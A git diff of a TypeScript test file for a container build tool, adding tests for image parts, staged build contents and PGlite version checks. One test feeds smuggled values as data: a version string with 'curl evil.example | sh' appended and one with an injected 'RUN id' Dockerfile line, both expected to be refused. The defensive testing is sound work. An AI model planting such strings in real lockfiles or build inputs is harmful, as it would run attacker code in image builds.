@@ -7,7 +7,7 @@ import { API_MANIFEST, DIGEST, json, SHA, tempPackage } from '../test-support/pa
 import { build } from './build.js';
 import { pgliteVersion, stageContainer } from './container-stage.js';
 import { type Docker, type DockerBuild } from './docker.js';
-import { KIT_PGLITE_RANGE } from './kit-version.js';
+import { containerParts, NO_API } from './container-parts.js';
 
 const ENV = { COMMIT_SHA: SHA, BUILD_TIME: '2026-11-15T10:00:00Z' };
 const STORE_MANIFEST = validateManifest({
@@ -49,7 +49,7 @@ describe('build --container', () => {
       version: '0.1.0',
       ...{ commit: SHA, buildTime: ENV.BUILD_TIME },
       images: [],
-      container: { tag: 'ghcr.io/agentage/probe:0.1.0' },
+      container: { tag: 'ghcr.io/agentage/probe:0.1.0', runs: ['api'], skipped: [] },
     });
     expect(f.builds).toHaveLength(1);
     expect(f.builds[0]).toMatchObject({ tag: 'ghcr.io/agentage/probe:0.1.0', buildArgs: ENV });
@@ -78,6 +78,47 @@ describe('build --container', () => {
   });
 });
 
+describe('the parts of the one image', () => {
+  it('runs the api part and lists every other part as not run yet', async () => {
+    const pkg = validateManifest({
+      ...API_MANIFEST,
+      agentage: {
+        ...API_MANIFEST.agentage,
+        parts: { api: true, mcp: true, worker: true, cli: true },
+        commands: [{ name: 'ping', summary: 'Answers pong' }],
+      },
+    });
+    const files = {
+      'dist/worker/index.js': 'export const create = () => null;',
+    };
+    expect(containerParts(pkg)).toEqual({ runs: ['api'], skipped: ['mcp', 'worker', 'cli'] });
+    const apiWorker = {
+      ...pkg,
+      agentage: {
+        ...pkg.agentage,
+        parts: { api: true, worker: true },
+        commands: undefined,
+      },
+    };
+    const dir = await packageDir(apiWorker, files);
+    const result = await build({ dir, env: ENV, container: true }, { ...fakes(), tmpRoot: dir });
+    expect(result.container).toMatchObject({ runs: ['api'], skipped: ['worker'] });
+  });
+
+  it('refuses a package with no api part before any build step', async () => {
+    const pkg = validateManifest({
+      ...API_MANIFEST,
+      agentage: { ...API_MANIFEST.agentage, parts: { mcp: true } },
+    });
+    const f = fakes();
+    const dir = await packageDir(pkg);
+    await expect(build({ dir, env: ENV, container: true }, { ...f, tmpRoot: dir })).rejects.toThrow(
+      NO_API
+    );
+    expect(f.builds).toEqual([]);
+  });
+});
+
 describe('container context', () => {
   it('carries all of dist, the OpenAPI file, the migrations and PGlite at the locked version; no seeds', async () => {
     const files = {
@@ -102,8 +143,37 @@ describe('container context', () => {
     );
   });
 
-  it('takes the kit peer range when the lock has no PGlite, and none without a postgres store', async () => {
-    expect(await pgliteVersion(await packageDir())).toBe(KIT_PGLITE_RANGE);
+  it('leaves out compiled tests, source maps and earlier records', async () => {
+    const files = {
+      'dist/api/index.test.js': 'x',
+      'dist/api/index.js.map': '{}',
+      'dist/agentage-extension.json': '{}',
+      'dist/agentage-container.json': '{}',
+      'dist/lib/agentage-data.json': '{}',
+    };
+    const dir = await packageDir(API_MANIFEST, files);
+    const root = await stageContainer(dir, API_MANIFEST, dir);
+    expect((await readdir(join(root, 'app', 'dist'))).sort()).toEqual(['api', 'lib']);
+    expect(await readdir(join(root, 'app', 'dist', 'api'))).toEqual(['index.js']);
+    expect((await readdir(join(root, 'app', 'dist', 'lib'))).sort()).toEqual([
+      'agentage-data.json',
+      'util.js',
+    ]);
+  });
+
+  it('takes the exact PGlite of the kit when the lock has none; refuses a range or a hostile string', async () => {
+    expect(await pgliteVersion(await packageDir(), () => '0.5.15')).toBe('0.5.15');
+    await expect(pgliteVersion(await packageDir(), () => undefined)).rejects.toThrow(
+      'no PGlite version'
+    );
+    for (const bad of ['^0.5.0', '0.5.16 && curl evil.example | sh', '0.5.16\nRUN id', 5]) {
+      const lock = { packages: { 'node_modules/@electric-sql/pglite': { version: bad } } };
+      const dir = await packageDir(API_MANIFEST, { 'package-lock.json': json(lock) });
+      await expect(pgliteVersion(dir)).rejects.toThrow('not an exact semver');
+    }
+  });
+
+  it('brings no PGlite without a postgres store', async () => {
     const dir = await packageDir();
     const recipe = await readFile(
       join(await stageContainer(dir, API_MANIFEST, dir), 'Dockerfile'),
